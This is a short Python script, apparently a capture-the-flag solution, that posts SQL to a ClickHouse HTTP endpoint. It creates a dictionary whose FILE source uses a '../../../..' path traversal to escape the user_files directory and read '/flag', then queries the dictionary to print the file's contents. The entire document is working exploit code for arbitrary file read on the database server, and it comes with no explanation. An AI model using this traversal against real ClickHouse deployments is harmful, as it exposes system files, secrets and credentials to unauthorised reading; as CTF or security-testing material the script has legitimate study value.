import re
import requests

host = 'http://localhost:8123'
path = '/'

file_to_read = '/flag'
requests.post(
	host + path,
	data=f"CREATE DICTIONARY flag (id UInt64, incomplete_flag String DEFAULT '') PRIMARY KEY id SOURCE(FILE(PATH '/var/lib/clickhouse/user_files/../../../..{file_to_read}' FORMAT 'CustomSeparated')) LIFETIME(MIN 0 MAX 1000) LAYOUT(FLAT()) SETTINGS(format_custom_field_delimiter = 'f', format_custom_row_after_delimiter = '')"
)

res = requests.post(host + path, data="SELECT concat('f', incomplete_flag) FROM flag")
print(res.text)
